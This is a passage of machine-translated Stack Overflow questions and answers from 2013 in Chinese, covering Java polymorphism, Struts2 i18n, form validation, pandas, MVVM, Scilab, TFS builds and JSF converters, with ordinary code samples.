> 
> 时间：2013-03-13T18:08:02.387

**更新**

在查找游戏数据时考虑传递“sport”参数。作为一个隐藏的领域，很可能。然后，您可以在模型中使用 switch 语句：

```
switch($gameValue) {
  case 'football': $gameTable = "footballGame"; break;
  case 'soccer': $gameTable = "soccerGame"; break;
} 
```

然后将您的查询基于此：

```
"SELECT * 
FROM ". $gameTable . "
...etc 
```

* * *

您可以将表与联接结合起来。[http://www.w3schools.com/sql/sql_join.asp](http://www.w3schools.com/sql/sql_join.asp)

例如，如果您需要从`game`和`footballGame`基于 15 的 footballGameId 获取所有数据：

```
SELECT *
FROM footballGame a
LEFT OUTER JOIN game b ON a.id = b.gameId
WHERE footballGameId = 15 
```

# java - 属性文件被卸载

> ID：15392829
> 
> 赞同：4
> 
> 时间：2013-03-13T17:52:51.323
> 
> 标签：java, struts2, internationalization

我有一个`Tomcat 7`在 Windows Server 2008 上运行的 Struts 2 Web 应用程序（只有 Tomcat，没有 Apache 或 IIS）。应用程序中的文本存储在 .properties 文件中，并由 Struts 2 I18N Interceptor 管理。在 JSP 中，我使用`<s:text name="menu.help" />`标签。
有时（上个月两次），应用程序会丢失对属性文件的引用，因为它们已被卸载，并且它开始显示键。例如对于英语，它总是显示“帮助”，但是当我遇到这个问题时，它开始显示“menu.help”。我必须重新启动应用程序才能使其再次正常工作。
我在日志中查找了相关错误，但找不到与 I18n 或属性相关的任何内容。我也找了`OutOfMemoryError`，但也找不到。
你知道可能是什么问题吗？你能想到我可以解决它的任何方法吗？
谢谢

**编辑：**
这是我的 struts.xml 的相关部分：

```
<struts>
    <constant name="struts.custom.i18n.resources" value="resources" />
    ... 
```

属性文件`(resources_en.properties, resources_es.properties, ...)`位于`WEB-INF/classes`目录中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-31T06:38:14.643

如果是内存问题，我建议您执行以下操作：

1.  最小化属性文件的大小，看看这是否解决了问题。所以首先最小化尺寸，做一个负载测试，看看结果。
2.  将其拆分为不同的属性文件，以查看是全部发生还是仅发生在其中一些

这是我个人的经验：

有时 JVM（错误地）会在一段时间不使用对象时对其进行垃圾收集。我对 JDK 4 和 oracle 应用程序服务器 9i 有同样的问题。当站点负载下降时，JVM 垃圾收集了数据库连接。所以，开发一个小的jsp页面（test.jsp），添加进去`<s:text name="menu.help" />`。然后，编写一个小应用程序，每 1 分钟请求一次该页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-29T15:01:44.777

我认为您需要一个默认属性：resources.properties

当然，这一次你得到的是键而不是翻译，因为没有设置默认的语言环境。

# java - 为什么引用子类对象的父类类型引用变量不能访问子类的方法

> ID：15392832
> 
> 赞同：1
> 
> 时间：2013-03-13T17:52:55.240
> 
> 标签：java, oop, polymorphism, encapsulation

既然这个对象（在标题中说明）可以调用子类中的重写方法，为什么它不能调用子类的其他方法？我需要尽可能详细的答案，例如内存组织、JVM 中的内部逻辑等。

下面的代码将使您清楚地理解我的问题。

```
class A
{
  int x=10;
  public  A()
  {
    System.out.println("Constructor of class A called!!!");
  }

  public void sayGreetings()
  {
    System.out.println("accept hye from class A");
  }
}

class C extends A
{
  int x=30;//why this is not accessed by stated object.
  public C()
  {
    System.out.println("Constructor of Class C caled!!!");
  }
  public void sayGreetings()
  {
    System.out.println("accept hye from class C");
  }
  public void ssa()
  {
    System.out.println("Sat Sri Akal ji from class C");
  }
}

public class ParentClassTypeObject 
{
  public static void main(String[] args)
  {
    C cObj=new C();
    cObj.sayGreetings();
    cObj.ssa();
    A aCObj=new C();//this is let say stated object,main object
    aCObj.sayGreetings();/*here we invoked method will be child class's 
                         overriden method.*/
    //aCObj.ssa(); //why this line gives error

    System.out.println("x="+aCObj.x);
  }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:54:39.500

因为您对对象的*接口*是您在编写时选择的接口：

```
A aCObj = new C(); 
```

如果您想通过变量访问`C`属性，请将`aCObj`其声明为`C`.

通过将其设置为`A`，您可以稍后编写：

```
aCObj = new A(); 
```

因此，由于变量可以指向`A`a 或 a `C`，编译器会限制您访问由该`A`类型公开的接口定义的方法。

您仍然可以访问这些方法`C`的*定义*，因为这是 OOP（多态性）的要点之一。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-05-28T22:20:10.383

引用变量指向同类型的对象或同类型的子集。

请考虑 Parent 和 Child 是两个类，其中 Parent 是超类，而 Child 继承父类。下图会给你一个详细的解释。 [![在此处输入图像描述](../Images/312d2995effcaaa2382bcfab53101008.png)](https://i.stack.imgur.com/2FIcF.jpg)

在上图中，父类引用变量将在子对象中搜索父类对象。它会找到它，因为它在那里。所以会给出输出。如果你在子类中有相同的方法（方法覆盖) 它将执行子类覆盖的方法。

但是对于子类引用变量，在父类对象中是找不到子类对象的。所以在这里，是不可能的。

[![在此处输入图像描述](../Images/5184568a0ab880b6c321c006a356ee54.png)](https://i.stack.imgur.com/EbSqr.png)

希望这可以消除您的困惑。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-11-08T18:29:33.913

如果你编译代码，你会得到编译时错误（不是运行时错误）。这背后的原因是

```
A aCObj=new C(); 
```

aCObj.sayGreetings();/* 编译器在编译时知道 aCobj 是 A 类型的引用。由于编译器认为 aCobj 属于 A 类型，并且 sayGreetings() 方法存在于 A 类中，因此调用此方法时不会出错 */

`aCObj.ssa();`/* 正如我上面提到的，编译器对运行时一无所知。在运行时 aCobj 将指向 C 类类型的对象，但在编译时编译器只知道 aCobj 是 A 类类型，并且由于 A 类没有名为 ssa() 的方法，因此会出现编译时错误。*/

object 的一个简单规则：在编译时检查赋值运算符的左侧。运行时赋值运算符的右侧。考虑这个陈述：

`Parent obj =new Child(); obj.method1(); obj.method2();`

无论您想使用 Parent 类型的 obj 引用调用什么方法，这些方法都应该存在于 Parent 类中，因为在编译期间编译器将严格检查 Parent 类中是否存在这些方法，即使它可能存在于 Child 类中。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-09-15T21:03:26.257

编译器根据引用变量的类型决定是否可以调用方法。因此，**如果**引用变量属于A类，则只能调用A类的方法。

但是编译器也会根据对象的实际类型而不是引用变量的类型来决定调用**哪个**方法，从而开始对继承树进行自下而上的检查。（它从子类一直向上开始）

所以在这种情况下，当你说`aCObj.sayGreetings();`编译器首先检查aCObj的引用类型时。A`A`类有`sayGreetings()`方法所以没问题。但是实际的对象是a `C`。所以编译器从子类（C）开始寻找这个方法是否是一直实现到超类 (A)。该方法``sayGreetings()`在 C 类中被覆盖。所以它调用`C class sayGreetings() method`（子类的）。

另一方面，该`ssa()`方法属于 C 类，并且由于引用变量属于 A 类，因此当您尝试时编译器会出错`aCObj.ssa();`

这只是多态性。由于 A 类引用变量可以是 A 或 C 对象，编译器将访问限制为仅对作为超类 A 的方法的通用方法的访问。接下来它检查该方法是否在类中实现实际对象（C）。如果不是，它会向上移动到超类（A）并调用超类的方法。但是如果它被实现，它会调用子类（C）的方法

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-13T17:59:02.420

对象的类型是 A 而不是 C，因此您无法访问实例变量，我认为如果将其公开，则可以。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-13T17:54:41.107

因为`aCObj`被声明为类型`A`，所以只有在类型 A 中声明的方法是可访问的。编译器不能保证它也是 C 类型。

例如

你可能还有

```
public class B extends A {
    public void sayGreetings() {
        ...
    }
} 
```

这没有 ssa 方法，但仍然可以分配给声明为 A 类型的对象

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-06-20T10:24:57.493

案例 1\. 父类的引用变量可以指向其子类的对象.. 案例 2\. 指向其子类对象的父类的引用变量可以类型转换为其子类的对象班级。

情况1：父类的引用变量只能调用父类内部定义的方法，也可以调用覆盖父类方法的子类方法，但不能调用独占的方法在儿童班。

情况2：父类的引用变量也可以调用其子类的方法。

这是由于多态性原理。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-06-20T06:22:57.267

这是您所述查询的详细说明：

**答案是“多态性”和“静态类型”的交集**. 因为 Java 在编译时是静态类型的，所以您可以从编译器中获得某些保证，但您不得不遵守规则作为交换，否则代码将无法编译。在这里，相关保证是子类型（例如 Child）的每个实例都可以用作其超类型（例如 Parent）的实例。例如，您可以保证当您访问employee.getEmployeeDetails 或employee.name 时，方法或字段定义在可以分配给Parent 类型的变量employee 的任何非空对象上。为了保证这一点，编译器在决定您可以访问的内容时仅考虑该静态类型（基本上是变量引用的类型，Parent）。因此，您无法访问在对象的运行时类型 Child 上定义的任何成员。

答案取自以下链接： [为什么我们在 Java 中为子对象分配父引用？](https://stackoverflow.com/questions/12159601/why-do-we-assign-a-parent-reference-to-the-child-object-in-java)

# html - 如何授予 apache 从目录中检索 imgs 的权限？

> ID：15392841
> 
> 赞同：0
> 
> 时间：2013-03-13T17:53:14.990
> 
> 标签：html, linux, apache, permissions, fedora

我正在使用 Fedora，我需要设置 apache 以便它可以从目录中检索图像。到目前为止，它可以在发送命令后写入我的图像目录...

semanage fcontext -a -t httpd_sys_rw_content_t '/var/www/profile-pics'

restorecon -v '/var/www/profile-pics'

但是当我尝试通过 localhost/profile-pics/my_pic.jpg 访问这些文件时，找不到 URL。正如我之前所说，我的 PHP 脚本能够从用户上传图像并写入该目录。我只是不明白为什么我无法检索图像并将它们发送回客户端。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:56:31.160

您需要使用 httpd 或 vhost 配置中的一个部分来允许访问：[http ://httpd.apache.org/docs/2.2/mod/core.html#directory](http://httpd.apache.org/docs/2.2/mod/core.html#directory)

# asp.net-mvc-3 - IEnumerable 选择列表项中的 mvc3 INT

> ID：15392842
> 
> 赞同：0
> 
> 时间：2013-03-13T17:53:15.133
> 
> 标签：asp.net-mvc-3, int, selectlistitem

我有一个从数据库收集数据并将其插入下拉列表的选择列表项。所有这些都有效，但我似乎无法使**INT**工作，例如，如果我写这个..等等。问题出在 ArticleID

```
 IEnumerable<SelectListItem> items = db.Articles.Where(c=>c.RegistrationID==getid)
 .Select(c => new SelectListItem
 {
      Value =c.ArticleID +"/"+ c.title,
       Text = c.ArticleID + "/" + c.title
 });
        ViewBag.articles = items; 
```

我收到错误**无法将类型“System.Int32”转换为类型“System.Object”** ，然后我的下拉列表被突出显示，即

```
@Html.DropDownList("article1",(IEnumerable<SelectListItem>)ViewBag.articles) 
```

我显然不能做**c.ArticleID.Tostring()**，那么我该如何解决这个问题？如果我把 ArticleID 拿出来，一切正常，但我需要在那里..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:09:37.013

您实际上会使用 c.ArticleID.ToString()。原因是您将字符串连接在一起，因此需要字符串值来执行此操作。Value 和 Text 都是字符串类型，因此您需要字符串是有道理的。

# mvvm - 为什么 ViewModel 没有在 MVVM 中实现 ICommand

> ID：15392845
> 
> 赞同：2
> 
> 时间：2013-03-13T17:53:27.093
> 
> 标签：mvvm, delegates, viewmodel, icommand

我正在尝试了解 WPF 应用程序的 MVVM

在下面的示例中，我们使用一个继承自 ICommand 的委托，然后在我们的 ViewModel 中，我们实例化该委托并提供适当的实现

我的问题是为什么我们不能让 ViewModel 实现 ICommand？

**视图模型：**

```
public class ViewModel : INotifyPropertyChanged
{
    public ViewModel()
    {
        InitializeViewModel();
    }

    protected void InitializeViewModel()
    {
        DelegateCommand MyCommand = new DelegateCommand<SomeClass>(
            SomeCommand_Execute, SomeCommand_CanExecute);    
    }

    void SomeCommand_Execute(SomeClass arg)
    {
        // Implementation
    }

    bool SomeCommand_CanExecute(SomeClass arg)
    {
        // Implementation
    }
} 
```

**委托命令：**

```
public class DelegateCommand<T> : ICommand
{
    public DelegateCommand(Action<T> execute) : this(execute, null) { }

    public DelegateCommand(Action<T> execute, Predicate<T> canExecute) : this(execute, canExecute, "") { }

    public DelegateCommand(Action<T> execute, Predicate<T> canExecute, string label)
    {
        _Execute = execute;
        _CanExecute = canExecute;
    }
.
.
.
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:00:21.500

原因是您的视图和命令数量之间存在一对多的关系。

通常每个 View 都有一个 ViewModel。但是您可能希望单个视图有许多命令。如果要将 ViewModel 用作命令，则必须有多个 ViewModel 实例。

典型的实现是您的 ViewModel 将包含您的 View 需要的所有命令的实例。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-13T18:03:13.930

简短的回答：因为您的 ViewModel 不是命令。

此外，您的 ViewModel 可以包含多个命令。

```
public class ViewModel : INotifyPropertyChanged
{
    public ViewModel()
    {
        InitializeViewModel();

        OpenCommand = new DelegateCommand<SomeClass>(
            param => { ... },
            param => { return true; }); 

        SaveCommand = new DelegateCommand<SomeClass>(
            param => { ... },
            param => { return true; });

        SaveAsCommand = new DelegateCommand<SomeClass>(
            param => { ... },
            param => { return true; });
    }

    public ICommand OpenCommand { get; private set; }

    public ICommand SaveCommand { get; private set; }

    public ICommand SaveAsCommand { get; private set; }
} 
```

现在您可以将这些命令绑定到您的视图，因为它们是一个属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:59:21.440

您可以通过`ICommand`这种方式实现 - 这是一种非常常见的实现方式`ICommand`。话虽如此，您仍然需要`MyCommand`在 ViewModel 上创建一个属性才能绑定到它。

# php - 验证我的表格？“请填写必填项”

> ID：15392846
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:53:27.447
> 
> 标签：php, javascript, html, forms

我有一个用户名表格。其中有2个字段，用户名和密码。基本上我想要它，所以如果用户没有输入字段并按下“提交”，则会显示错误，如“请输入必填字段”

我知道使用 JavaScript 或 PHP 是可能的，但不确定如何去做。

这是用户和密码表单的代码：

```
<div id="sessionContainer" class="clearfix">
  <div class="content">
    <form action="goto.php" class=" sign-in" method="post">
      <div style="margin:0;padding:0"></div>
      <h3>Enter Details</h3>
      <p><font size="-1">Please enter your details</font></p><br>
      <div class="clearfix">
        <label for="">Username or email address</label><br>
        <input class="xlarge" id="email" name="email" tabindex="1" type="text" value="" />
      </div>
      <div class="clearfix">
        <label for=""><br>
          Password</label><br>
        <input class="xlarge" id="password" name="password" tabindex="2" type="password" value="" />
      </div>

      <p class="remember">&nbsp;</p>
      <p class="remember">
        <button class="btn btn-m btn-blue" id="signin_submit" name="commit" type="submit" tabindex=5>Sign in</button>
      </p> 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:57:32.290

```
<?php if(!isset($_POST['email']) || !isset($_POST['password']) 
```

此代码将检查这些字段中的任何一个是否有值。如果没有，您可以输出错误消息。整个上下文中的代码如下：

```
<?php if(!isset($_POST['email']) || !isset($_POST['password']): ?>
    <div>Please fill in all fields!</div>
<?php endif; ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:12:06.850

这是我的答案...在经典的 javascript xD 中：

```
<html>
  <head>
  <script type="text/javascript">
  function validar()
  {
     var right = 1;

     if(document.getElementById('email').value.length==0)
     {
        right = 0;
        document.getElementById('emptymail').innerHTML = "Empty Mail o Username";
     }
     if(document.getElementById('password').value.length==0)
     {
        right = 0;
        document.getElementById('emptypass').innerHTML = "Empty Password";
     }

    if(right == 1)
    {
      document.forms["formu"].submit();
    }

  }
  </script>
  </head>
  <body>
  <form action="goto.php" class=" sign-in" method="post" name="formu" id="formu">
        <div style="margin:0;padding:0"></div>
        <h3>Enter Details</h3>
        <p><font size="-1">Please enter your details</font></p><br>
        <div class="clearfix">
          <label for="">Username or email address</label><br>
          <input class="xlarge" id="email" name="email" tabindex="1" type="text" value="" /><div id="emptymail"></div>
        </div>
        <div class="clearfix">
          <label for=""><br>
            Password</label><br>
          <input class="xlarge" id="password" name="password" tabindex="2" type="password" value="" /><div id="emptypass"></div>
        </div>

        <p class="remember">&nbsp;</p>
        <p class="remember">
          <button class="btn btn-m btn-blue" id="signin_submit" name="commit" type="button" tabindex=5 onclick="validar();">Sign in</button>
        </p>

  </form>
  </body>
  </html> 
```

萨卢多斯 ;)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:58:46.470

[`required`](http://www.w3schools.com/tags/att_input_required.asp)使用该属性的仅 HTML 解决方案（仅适用于较新的浏览器）：

```
<input required="required" /> 
```

一个如何做一个基于 jscript 的解决方案的例子可以在[这里](http://www.w3schools.com/js/js_form_validation.asp)找到，[这里](http://www.i-coding.de/www/en/javascript/form/input-validation.html)或者[这个带有一点 jquery 帮助的](https://stackoverflow.com/questions/5886555/check-if-input-empty-on-submit)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T18:00:10.673

使用[jQuery Validate](http://docs.jquery.com/Plugins/Validation/validate)进行验证

从[这里](http://plugins.jquery.com/validate/)下载并调用它。然后添加此代码

```
rules:
{
    email:
    {
        required: true
    }

},
messages:
{
    email:
    {
        required: "Please enter your email."
    }
} 
```

**或者只是使用 HTML 5 验证**

```
<input id="email" name="email"  type="text" value="" required /> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-13T18:03:17.343

要使用 JavaScript 执行此操作，您正在寻找表单的 OnSubmit 属性

如果您使用 OnSubmit 调用的函数失败（返回 false），您可以做很多事情，但作为示例，此代码将显示一个弹出框

```
<script>
function checkForm()
{
  if (document.getElementById('email').value.length==0 || document.getElementById('password').value.length==0)
  (
    alert("fill in required fields")
    return false;
  )
  return true;
}
<script> 
```

然后在您放置的表单标签中

```
<form onsubmit="return checkForm()" ... 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-13T18:09:16.993

```
var $form = $('form'),
    $user = $('#email),
    $pass = $('#password');

$form.on('submit', function(e) {
    e.preventDefault();   // stop the default behavior
    if ($user.text().length === 0) {
        $user.addClass('error'); // do something with the error class or add attribute 'required'
    } else if ($pass.text().length === 0) {
        // do something else
    } else if ($user.text().length > 0 && $pass.text().length > 0) {
          // post the form
          $.ajax({
              url: //URL where you send,
              data: $form.serialize(),
              success: function(e) { // do something },
              error: function(e) { // do something }
        });
    }
} 
```

# java - 从字符串到字节的 10 位二进制数

> ID：15392855
> 
> 赞同：1
> 
> 时间：2013-03-13T17:53:54.693
> 
> 标签：java, binary

目前我有一个 8 位二进制字符串，我想把它左移并从中得到一个 10 位二进制数。（即0111001010）

```
 String[] channels = datArray.get(n).split(" ");
 byte[] RI = channels[m+1].getBytes();
 String s = (Integer.toBinaryString(Integer.parseInt(channels[m+1]))); 
```

示例值：

RI 等于：[B@4223b758

S 等于：1100101

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:00:38.007

您可以使用以下内容：

```
BigInteger i = new BigInteger("00000011" + "00", 2);
int x = i.intValue(); 
```

其中“00000011”是 8 位数字的字符串表示形式。“00”模拟左移..

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T18:13:10.053

这不适合你吗：

```
String input = "1100101";
int value = Integer.parseInt(input, 2) << 1;
System.out.println(Integer.toBinaryString(value)); 
```

回报：

```
11001010 
```

解析二进制字符串并左移（一位）。

您的方法中似乎缺少的两件事是在解析表示二进制数字的字符串时[指定 a的能力，以及`radix`](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Integer.html#parseInt%28java.lang.String,%20int%29)[左移运算符](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/op3.html)。

如果你想要前导零，我很惊讶地发现没有内置的方法来实现这一点，目前的智慧是这是最佳方式（取自[这个讨论](https://stackoverflow.com/questions/4421400/how-to-get-0-padded-binary-representation-of-an-integer-in-java)）

```
System.out.println(String.format("%10s", Integer.toBinaryString(value)).replace(' ', '0')); 
```

对于给出的示例值，哪个将返回：

```
0011001010 
```

# python - 有条件地设置 DataFrame 的非空值

> ID：15392856
> 
> 赞同：5
> 
> 时间：2013-03-13T17:54:03.053
> 
> 标签：python, pandas

我有一个数据框：

```
 0         1         2   3         4  y
35 NaN       NaN       NaN NaN  0.342153  0
40 NaN  0.326323       NaN NaN       NaN  0
43 NaN       NaN  0.290126 NaN       NaN  0
49 NaN  0.326323       NaN NaN       NaN  0
50 NaN  0.391147       NaN NaN       NaN  1 
```

以及生成它的代码：

```
import pandas as pd
import numpy as np

nan = np.nan

df = pd.DataFrame(
{0L: {35: nan, 40: nan, 43: nan, 49: nan, 50: nan},
 1L: {35: nan,
  40: 0.32632316859446198,
  43: nan,
  49: 0.32632316859446198,
  50: 0.39114724480578139},
 2L: {35: nan, 40: nan, 43: 0.29012581014105987, 49: nan, 50: nan},
 3L: {35: nan, 40: nan, 43: nan, 49: nan, 50: nan},
 4L: {35: 0.34215328467153283, 40: nan, 43: nan, 49: nan, 50: nan},
 'y': {35: 0, 40: 0, 43: 0, 49: 0, 50: 1}}) 
```

我需要使用以下伪代码为每一列分配一个值：

```
column = 1 if column > threshold else 0 where column != NaN 
```

我曾尝试使用花式索引来完成此操作：

```
df.ix[df[1].notnull(),1] = 1; df

     0   1         2   3         4  y
35 NaN NaN       NaN NaN  0.342153  0
40 NaN   1       NaN NaN       NaN  0
43 NaN NaN  0.290126 NaN       NaN  0
49 NaN   1       NaN NaN       NaN  0
50 NaN   1       NaN NaN       NaN  1 
```

但是 A）我不确定如何应用条件逻辑和 B）我必须将逻辑迭代地应用到每一列而不是整个数据框。

**问题：**

> 如何将条件逻辑应用于数据帧的非空值，同时保留其他字段的空值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T18:05:03.507

```
# you need this because your y column is an int64 (otherwise this the next step
# will throw an exception), on the to fix list in 0.11-dev though
In [71]: df = orig_df.astype('float64')

# use boolean indexing!
# NaN are automatically excluded
In [72]: df[df>0.3] = 1 ; df[df<=0.3] = 0

In [73]: df
Out[73]: 
     0   1         2   3   4  y
35 NaN NaN       NaN NaN   1  0
40 NaN   1       NaN NaN NaN  0
43 NaN NaN         0 NaN NaN  0
49 NaN   1       NaN NaN NaN  0
50 NaN   1       NaN NaN NaN  1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-13T18:15:23.893

您可以使用`applymap`，因为您似乎真的想要一个元素操作：

```
>>> df.applymap(lambda x: x if pd.isnull(x) else (1 if x > 0.3 else 0))
     0   1   2   3   4  y
35 NaN NaN NaN NaN   1  0
40 NaN   1 NaN NaN NaN  0
43 NaN NaN   0 NaN NaN  0
49 NaN   1 NaN NaN NaN  0
50 NaN   1 NaN NaN NaN  1 
```

尽管在这种特殊情况下我们可以作弊（两次）：

```
>>> (df > 0.3) * 1 + df * 0
     0   1   2   3   4  y
35 NaN NaN NaN NaN   1  0
40 NaN   1 NaN NaN NaN  0
43 NaN NaN   0 NaN NaN  0
49 NaN   1 NaN NaN NaN  0
50 NaN   1 NaN NaN NaN  1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-11-06T20:36:53.520

您正在寻找的是`iterrows()`方法。[熊猫文档](http://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.iterrows.html#pandas.DataFrame.iterrows)

我不是 100% 确定你试图用伪代码完成什么，但下面会修改新系列（可以分配给数据框）。

```
updated = df['data']
for index, row in df.iterrows():
    if ((not pd.isnull(df[index])) and df[index] > threshold) :
        updated[index] = 1.0
    else:
        updated[index] = 0.0
df['data'] = updated 
```

它很可能也会`SettingWithCopyWarning`在迭代器中向您发出有关分配的警告，因此请谨慎使用。

# java - 如何使用自定义（已安装）字体在 Java 中显示非英文文本

> ID：15392857
> 
> 赞同：1
> 
> 时间：2013-03-13T17:54:09.513
> 
> 标签：java, unicode, fonts, awt

我无法使用自定义字体在我的 awt 应用程序中显示乌尔都语文本。我是java新手，我已经彻底搜索了api和互联网，但无济于事。有趣的是，乌尔都语文本可以使用 Times New Roman、Arial 等字体显示，但不能使用我想要使用的字体，尽管它的 ttf 并且能够显示所有字形。

我应该使用哪些包/类来解决这个问题？

任何帮助将不胜感激。

# matlab - Scilab，将文本添加到图像

> ID：15392865
> 
> 赞同：0
> 
> 时间：2013-03-13T17:54:27.950
> 
> 标签：matlab, image-processing, scilab

我想使用 Scilab 在图像中添加文本；起初我想使用 SIVP imshow，但事实证明这个函数没有返回句柄。另一方面，IPD 的 ShowImage 确实返回了一个句柄，所以我想我可以这样做：

```
sceneImgFigure = ShowColorImage(sceneImg,"Scene");

for k=1:size(inspectedScene)
    uicontrol(sceneImgFigure, ...
              "style", "text", ...
              "string", mtlb_num2str(inspectedScene(k).alocated_label), ...
              "position", [inspectionModel(k).centroid(1) inspectionModel(k).centroid(2) 20 20], ...
              "fontsize",15, ...
              "BackgroundColor",[0.9,0.9,0.9]);
end 
```

但是使用 uicontrol 我使用图形坐标，而不是图像坐标，这导致文本显示在错误的位置。此外，ShowImage 裁剪图像。这是我得到的：

![在此处输入图像描述](../Images/5b56d55cb508f42b90aacfedf6d7e50d.png)

我在 Scilab 的帮助上找不到任何相关答案，所以我有点卡在这里。有一种[方法](http://www.mathworks.com/support/solutions/en/data/1-1BALJ/)可以在 Matlab 中做我想做的事，但代码似乎无法翻译成 Scilab（Scilab 中没有文本或 getframe 函数，首先......）。

任何的想法 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T15:07:47.417

我用来`xstring`根据绘图坐标系将注释放在绘图上。根据您的基本图像的格式，您可能可以使用`imageplot`（我认为来自 SIVP）来绘制图像，我相信图像像素映射到绘图坐标。

```
xstring(inspectionModel(k).centroid(1), inspectionModel(k).centroid(2), mtlb_num2str(inspectedScene(k).alocated_label)) 
```

如果您不能使用`imgplot`，您可能必须手动缩放所有坐标。它并不像听起来那么糟糕 - 如果您知道图像的大小，您可以计算出坐标系的比例因子。我做了这样的事情，所以我可以在`imageplot`使用小波工具箱做频谱图时将轴放在一个上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T16:50:07.420

这是我为解决这个问题所做的（以防万一有一天它对某人有用）：

```
ShowColorImage(sceneImg,"Scene");
for i=1:size(inspectedScene)
    xstring(inspectedScene(i).centroid(1)-5, ...
            size(classDispImg,1)-inspectedScene(i).centroid(2)-5, ...
            mtlb_num2str(inspectedScene(i).alocated_label));
    e = gce();
    e.font_size = 1; 
    e.font_foreground = color(0,0,0);
end 
```

这使 ：

![在此处输入图像描述](../Images/6a7b22c8dca30644e3d65c4f4e6a52b7.png)

我从 Scilab 用户邮件列表中获得了部分解决方案。正如 xenoclast 所说，我认为我必须使用图像高度来缩放 y 坐标。

# python - 'Int' 对象不能用简单方程调用

> ID：15392877
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:55:14.877
> 
> 标签：python, int

我使用 Python 2.7 的 IDLE 接口，并且收到“int object not callable”错误并试图弄清楚我得到它的确切原因。我对 Python 还是比较陌生。我去检查[Beginner Errors: Python.org](http://wiki.python.org/moin/BeginnerErrorsWithPythonProgramming)并无法找出我的问题。

我只是输入 6/5(6+7) 并得到错误。我可以摆脱括号，它工作正常。有人可以解释为什么会这样，以便我以后可以避免这个问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:57:04.250

您不能通过简单地将数字彼此相邻或用括号括起来来相乘，您需要明确使用`*`：

```
6/5*(6+7) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:56:37.953

要乘以`6/5`，请`(6+7)`使用`*`：

```
6/5*(6+7) 
```

# msbuild - TFS 2012 - 使用自动构建时不生成二进制文件

> ID：15392886
> 
> 赞同：1
> 
> 时间：2013-03-13T17:55:34.847
> 
> 标签：msbuild, continuous-integration, tfsbuild, automated-deploy

我是 TFS 的新手。我正在尝试在签入 TFS 中的代码时自动化构建过程。我设置了一个控制器和一个代理。我创建了一个新的构建定义并在 c: 上设置了一个“build”和“drop”文件夹。我签入代码，希望在“drop”文件夹中看到生成的 dll 文件。没有，只有“日志”文件夹。“build”文件夹中的“binaries”文件夹也是空的。显然，根本没有生成二进制文件。如何让 MSBuild 生成 dll 文件？它们是当我在我的开发机器上的“bin\”文件夹下本地编译网站时生成的。该解决方案由两个独立的项目组成：“core”和“web”，其中“core”在“web”中引用。有什么想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-14T08:40:17.303

您运行的构建的`Summary`显示是什么？还是您的构建中有错误？您可以通过在 Visual Studio 中打开构建然后单击来检查构建日志`View Log`。

# jsf-2 - 在 FacesConverter 中使用 ManagedBean

> ID：15392887
> 
> 赞同：5
> 
> 时间：2013-03-13T17:55:35.147
> 
> 标签：jsf-2, facelets

我想`ManagedBean`在我的`Converter`. `ManagedBean`负责从数据库中获取数据。在`Converter`我想将字符串转换为必须从数据库中获取的对象。

这是我的转换器

```
@FacesConverter(forClass=Gallery.class, value="galleryConverter")
public class GalleryConverter implements Converter {

    // of course this one is null
    @ManagedProperty(value="#{galleryContainer}")
    private GalleryContainer galleryContainer;

    @Override
    public Object getAsObject(FacesContext context, UIComponent component, String galleryId) {
        return galleryContainer.findGallery(galleryId);
        ...
    }

    @Override
    public String getAsString(FacesContext context, UIComponent component, Object gallery) {
        ...
    }

} 
```

我知道这`galleryContainer`将是空的，如果我想注入`ManagedBean`，`Converter`我也可以标记它`ManagedBean`。问题是我想以漂亮的方式来做，我不想寻找一些“奇怪的解决方案”。也许问题出在我的应用程序中？也许还有其他一些好的解决方案来创建必须从数据库获取数据并在转换器中使用的对象？我还想提一下，我更喜欢使用`DependencyInjection`而不是使用语句创建新对象`new`（它更容易测试和维护）。有什么建议么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-13T18:35:58.973

而不是使用`@FacesConverter`你应该使用`@ManagedBean`，因为当前 faces 转换器不是有效的注入目标。尽管如此，您可以选择您的转换器作为托管 bean，因此在您的视图中将其称为`converter="#{yourConverter}"`（通过托管 bean 名称）而不是`converter="yourConverter"`（通过转换器 id）。

基本用法示例：

```
@ManagedBean
@RequestScoped
